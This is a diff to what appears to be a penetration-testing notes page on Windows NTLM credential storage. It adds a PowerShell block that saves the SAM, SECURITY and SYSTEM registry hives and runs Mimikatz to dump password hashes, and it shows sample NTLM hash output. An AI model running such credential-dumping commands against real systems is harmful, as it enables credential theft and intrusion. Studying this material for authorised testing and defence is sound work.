@@ -4,7 +4,7 @@ description: >-
   password hashes in Windows.
 ---
 
-# NTLM
+# NTLM Toolkit
 
 Credentials are stored when a user logs into an account & when a user runs a service. More information below.
 
@@ -12,13 +12,9 @@ Credentials are stored when a user logs into an account & when a user runs a ser
 
 Passwords hashes on Windows are stored in the Security Account Manager (SAM) database file. _**This is used to authenticate local and remote users.**_
 
-
-
-
-
 ## Local Security Authority Subystem (LSASS).
 
-
+LSA stands for **Local Security Authority** and it is a special process which is responsible for authenticating users and verifying Windows logins.
 
 ## Mimikatz
 
@@ -28,11 +24,18 @@ We can use various commands to extract passwords from the system.
 
 For both the following commands, we must have **SeDebugPrivilege** access right enabled, which we'll accomplish with **privilege::debug**.
 
+### **LSA memory content**
+
+```powershell
+reg save hklm\sam sam.hiv
+reg save hklm\security security.hiv
+reg save hklm\system system.hiv
+./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
+```
+
 ### sekurlsa**::logonpasswords**
 
 **sekurlsa::logonpasswords** attempts to extract plaintext passwords and password hashes from all available sources.
-
-
 
 ### l**sadump::sam**
 
@@ -66,8 +69,6 @@ User : nelly
   Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
 ...
 ```
-
-
 
 
 
